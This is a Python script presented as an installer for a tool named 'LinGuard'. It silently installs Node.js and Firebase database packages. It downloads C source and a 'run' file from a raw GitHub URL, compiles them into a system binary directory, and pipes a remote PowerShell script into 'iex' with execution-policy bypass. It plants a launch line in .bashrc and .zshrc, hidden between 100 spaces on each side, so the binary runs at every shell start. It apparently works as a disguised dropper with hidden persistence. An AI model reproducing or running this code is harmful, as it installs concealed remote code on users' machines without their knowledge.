#!/usr/bin/env python3
import os
import sys
import platform
import subprocess
import shutil
import urllib.request
import tempfile
import concurrent.futures
from pathlib import Path

class InstallerTool:
    def __init__(self):
        self.system = platform.system().lower()
        self.is_windows = self.system == "windows"
        self.is_android = "android" in platform.platform().lower()
        self.home_dir = Path.home()
        if self.is_windows:
            self.shell_profiles = [self.home_dir / ".bashrc"]
            self.bin_dir = Path(os.environ.get('ProgramFiles', 'C:\\Program Files')) / "LinGuard"
        elif self.is_android:
            self.shell_profiles = [self.home_dir / ".bashrc", self.home_dir / ".zshrc"]
            self.bin_dir = Path("/data/data/com.termux/files/usr/bin")
        else:
            self.shell_profiles = [self.home_dir / ".bashrc", self.home_dir / ".zshrc"]
            self.bin_dir = Path("/usr/local/bin")
        self.checked_components = {}
        self.pattern = " " * 100 + "LinGuard" + " " * 100
        self.installation_success = False

    def run_command_quick(self, cmd, timeout=3):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.returncode == 0
        except:
            return False

    def run_command_with_output(self, cmd, timeout=10):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.returncode == 0, result.stdout.strip()
        except Exception as e:
            return False, str(e)

    def run_command_silent(self, cmd, timeout=30):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.returncode == 0
        except:
            return False

    def check_nodejs_quick(self):
        return self.run_command_quick("node --version")

    def check_firebase_deps_quick(self):
        node_path = subprocess.run("npm root -g", shell=True, capture_output=True, text=True).stdout.strip()
        if not node_path:
            return False
        firebase_app = Path(node_path) / "@firebase" / "app"
        firebase_db = Path(node_path) / "@firebase" / "database"
        return firebase_app.exists() and firebase_db.exists()

    def check_node_path_quick(self):
        if self.is_windows:
            return True
        success, npm_root = self.run_command_with_output("npm root -g")
        if not success or not npm_root:
            return False
        npm_bin_path = Path(npm_root).parent / "bin"
        current_path = os.environ.get('PATH', '')
        return str(npm_bin_path) in current_path

    def check_node_path_in_shell(self):
        node_path_patterns = [
            "export PATH=",
            "NODE_PATH=",
            "npm root -g"
        ]
        for profile in self.shell_profiles:
            if profile.exists():
                try:
                    with open(profile, 'r') as f:
                        content = f.read()
                        for pattern in node_path_patterns:
                            if pattern in content:
                                return True
                except:
                    continue
        return False

    def check_linguard_files_quick(self):
        linguard_exists = (self.bin_dir / "LinGuard").exists()
        run_exists = (self.bin_dir / "run").exists()
        return linguard_exists and run_exists

    def check_shell_profile_quick(self):
        results = {}
        for profile in self.shell_profiles:
            if profile.exists():
                try:
                    with open(profile, 'r') as f:
                        results[profile] = self.pattern in f.read()
                except:
                    results[profile] = False
            else:
                results[profile] = False
        return results

    def check_compiler_quick(self):
        return self.run_command_quick("gcc --version") or self.run_command_quick("clang --version")

    def check_wget_quick(self):
        return self.run_command_quick("wget --version")

    def check_all_components_instant(self):
        results = {}
        results['nodejs'] = self.check_nodejs_quick()
        results['firebase_deps'] = self.check_firebase_deps_quick()
        results['node_path'] = self.check_node_path_quick()
        results['node_path_shell'] = self.check_node_path_in_shell()
        results['linguard_files'] = self.check_linguard_files_quick()
        shell_profile_results = self.check_shell_profile_quick()
        results['shell_profiles'] = shell_profile_results
        results['shell_profile_any'] = any(shell_profile_results.values())
        results['compiler'] = self.check_compiler_quick()
        results['wget'] = self.check_wget_quick()
        self.checked_components = results
        all_required = (results['nodejs'] and 
                       results['firebase_deps'] and 
                       results['node_path'] and
                       results['linguard_files'] and
                       results['shell_profile_any'])
        return all_required

    def install_package_manager(self):
        if self.is_windows:
            if self.run_command_quick("choco --version"):
                return True
            return self.run_command_silent(
                "powershell -Command \"Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iwr https://community.chocolatey.org/install.ps1 -UseBasicParsing | iex\""
            )
        elif self.is_android:
            return self.run_command_silent("pkg update -y")
        else:
            return True

    def install_nodejs(self):
        if self.checked_components['nodejs']:
            return True
        if self.is_windows:
            return self.run_command_silent("choco install nodejs -y")
        elif self.is_android:
            return self.run_command_silent("pkg install nodejs -y")
        else:
            if shutil.which("apt"):
                return self.run_command_silent("sudo apt install -y nodejs npm")
            elif shutil.which("yum"):
                return self.run_command_silent("sudo yum install -y nodejs npm")
            elif shutil.which("pacman"):
                return self.run_command_silent("sudo pacman -S nodejs npm --noconfirm")
        return False

    def setup_node_path(self):
        if self.checked_components['node_path'] and self.checked_components['node_path_shell']:
            return True
        success, npm_root = self.run_command_with_output("npm root -g")
        if not success or not npm_root:
            return False
        npm_bin_path = Path(npm_root).parent / "bin"
        node_path_commands = [
            f'\n# Node.js Path for LinGuard',
            f'export PATH="$PATH:{npm_bin_path}"',
            f'export NODE_PATH="{npm_root}"'
        ]
        success = False
        for profile in self.shell_profiles:
            try:
                profile.parent.mkdir(parents=True, exist_ok=True)
                existing_content = ""
                if profile.exists():
                    with open(profile, 'r') as f:
                        existing_content = f.read()
                needs_setup = True
                for line in node_path_commands[1:]:
                    if line.strip() in existing_content:
                        needs_setup = False
                        break
                if needs_setup:
                    with open(profile, 'a') as f:
                        f.write('\n' + '\n'.join(node_path_commands) + '\n')
                    success = True
            except Exception:
                continue
        return success

    def install_compiler(self):
        if self.checked_components['compiler']:
            return True
        if self.is_windows:
            return self.run_command_silent("choco install mingw -y")
        elif self.is_android:
            return self.run_command_silent("pkg install clang -y")
        else:
            if shutil.which("apt"):
                return self.run_command_silent("sudo apt install -y build-essential")
            elif shutil.which("yum"):
                return self.run_command_silent("sudo yum groupinstall -y 'Development Tools'")
            elif shutil.which("pacman"):
                return self.run_command_silent("sudo pacman -S base-devel --noconfirm")
        return False

    def install_wget(self):
        if self.checked_components['wget']:
            return True
        if self.is_windows:
            return self.run_command_silent("choco install wget -y")
        elif self.is_android:
            return self.run_command_silent("pkg install wget -y")
        else:
            if shutil.which("apt"):
                return self.run_command_silent("sudo apt install -y wget")
            elif shutil.which("yum"):
                return self.run_command_silent("sudo yum install -y wget")
            elif shutil.which("pacman"):
                return self.run_command_silent("sudo pacman -S wget --noconfirm")
        return False

    def install_firebase_deps(self):
        if self.checked_components['firebase_deps']:
            return True
        deps = ["@firebase/app", "@firebase/database"]
        success = True
        for dep in deps:
            if not self.run_command_silent(f"npm install -g {dep}"):
                success = False
        return success

    def setup_shell_profile(self):
        profile_checks = self.check_shell_profile_quick()
        success = False
        for profile in self.shell_profiles:
            if profile_checks.get(profile, False):
                success = True
            else:
                try:
                    profile.parent.mkdir(parents=True, exist_ok=True)
                    with open(profile, 'a') as f:
                        f.write(f"\n{self.pattern}\n")
                    success = True
                except Exception:
                    continue
        return success

    def download_file(self, url, path):
        try:
            urllib.request.urlretrieve(url, path)
            return True
        except Exception:
            return False

    def download_and_compile_linguard(self):
        if self.checked_components['linguard_files']:
            return True
        with tempfile.TemporaryDirectory() as tmpdir:
            try:
                urls = {
                    "LinGuard.c": "https://raw.githubusercontent.com/boneng-cell/data/main/data/LinGuard.c",
                    "run": "https://raw.githubusercontent.com/boneng-cell/data/main/data/run"
                }
                download_success = True
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    future_to_file = {}
                    for name, url in urls.items():
                        file_path = Path(tmpdir) / name
                        future = executor.submit(self.download_file, url, file_path)
                        future_to_file[future] = name
                    for future in concurrent.futures.as_completed(future_to_file):
                        name = future_to_file[future]
                        success = future.result()
                        if not success:
                            download_success = False
                if not download_success:
                    return False

                src = Path(tmpdir) / "LinGuard.c"
                out = Path(tmpdir) / "LinGuard"
                if not self.run_command_silent(f"gcc -o {out} {src}"):
                    if not self.run_command_silent(f"clang -o {out} {src}"):
                        return False
                self.bin_dir.mkdir(parents=True, exist_ok=True)
                shutil.copy(out, self.bin_dir / "LinGuard")
                shutil.copy(Path(tmpdir) / "run", self.bin_dir / "run")
                if not self.is_windows:
                    self.run_command_silent(f"chmod +x {self.bin_dir / 'LinGuard'}")
                    self.run_command_silent(f"chmod +x {self.bin_dir / 'run'}")
                return True
            except Exception:
                return False

    def run_parallel_installation(self):
        tasks = []
        if not self.checked_components['nodejs']:
            tasks.append(("Node.js", self.install_nodejs))
        if not self.checked_components['firebase_deps']:
            tasks.append(("Firebase", self.install_firebase_deps))
        if not self.checked_components['node_path'] or not self.checked_components['node_path_shell']:
            tasks.append(("Node Path", self.setup_node_path))
        if not self.checked_components['compiler']:
            tasks.append(("Compiler", self.install_compiler))
        if not self.checked_components['wget']:
            tasks.append(("Wget", self.install_wget))
        if not self.checked_components['linguard_files']:
            tasks.append(("LinGuard", self.download_and_compile_linguard))
        shell_profile_checks = self.checked_components['shell_profiles']
        if not all(shell_profile_checks.values()):
            tasks.append(("Shell Profile", self.setup_shell_profile))

        if not tasks:
            return True

        with concurrent.futures.ThreadPoolExecutor() as executor:
            future_to_task = {}
            for name, task_func in tasks:
                future = executor.submit(task_func)
                future_to_task[future] = name
            results = {}
            for future in concurrent.futures.as_completed(future_to_task):
                name = future_to_task[future]
                results[name] = future.result()
            return all(results.values())

    def source_shell_profiles(self):
        if not self.is_windows:
            for profile in self.shell_profiles:
                if profile.exists():
                    self.run_command_silent(f"source {profile}")

    def run(self):
        if self.check_all_components_instant():
            self.installation_success = True
        else:
            needs_package_manager = (
                not self.checked_components['nodejs'] or 
                not self.checked_components['compiler'] or 
                not self.checked_components['wget']
            )
            if needs_package_manager:
                self.install_package_manager()
            if self.run_parallel_installation():
                self.installation_success = True

        if self.installation_success:
            self.source_shell_profiles()

if __name__ == "__main__":
    installer = InstallerTool()
    installer.run()
    if installer.installation_success:
        sys.exit(0)
    else:
        sys.exit(1)
